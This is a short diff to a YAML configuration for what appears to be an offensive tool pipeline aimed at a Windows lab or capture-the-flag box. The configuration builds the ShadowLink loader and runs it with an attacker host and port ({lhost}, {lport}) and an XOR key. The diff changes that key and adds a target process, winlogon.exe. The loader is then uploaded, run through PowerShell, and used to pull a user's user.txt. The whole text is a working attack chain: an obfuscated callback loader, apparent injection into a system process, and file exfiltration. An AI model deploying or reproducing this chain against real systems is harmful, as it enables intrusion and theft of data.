@@ -18,7 +18,7 @@ tool:
   repo_url: https://github.com/grisuno/ShadowLink.git
   install_path: external/.exploit/ShadowLink
   install_command: make windows
-  execute_command: chmod +x *.sh && ./main.sh windows {lhost} {lport} xor 0x55
+  execute_command: chmod +x *.sh && ./main.sh windows {lhost} {lport} xor 0x33 winlogon.exe
   upload_file: no_priv ./external/.exploit/ShadowLink/loader_windows.exe
   remote_command: no_priv powershell .\loader_windows.exe
   download_file: C:\Users\nathan.aadam\Desktop\user.txt
